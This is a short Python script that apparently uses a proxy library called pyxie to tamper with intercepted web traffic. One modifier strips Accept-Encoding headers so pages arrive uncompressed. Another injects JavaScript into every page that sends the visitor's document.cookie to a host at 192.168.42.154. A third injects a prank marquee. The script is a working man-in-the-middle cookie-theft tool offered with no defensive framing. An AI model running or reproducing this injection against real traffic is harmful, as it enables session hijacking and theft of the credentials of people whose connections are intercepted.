import pyxie, sys, re

def mod1(data):
  return re.sub(r'Accept-Encoding:.*\r\n', '', data)

def mod2(data):
  javascript = '<script>var img=document.createElement("img");img.src="http://192.168.42.154/index.php?c="+encodeURIComponent(document.cookie);document.getElementsByTagName("body")[0].appendChild(img);</script>'
  return data.replace('</body>', javascript+"</body>")

def mod3(data):
  javascript = '<marquee>huehuehuehuehuehuehuehuehuehuehuehuehuehuehue</marquee>'
  return data.replace('</body>', javascript+"</body>")

def main():
  try:
    pyxie.add_modifier(pyxie.CustomModifier(mod1))
    pyxie.add_modifier(pyxie.CustomModifier(mod2))
    pyxie.add_modifier(pyxie.CustomModifier(mod3))
    pyxie.start()
  except KeyboardInterrupt as e:
    print e
    pyxie.stop()
    sys.exit(0)

if __name__ == "__main__":
  sys.exit(main())
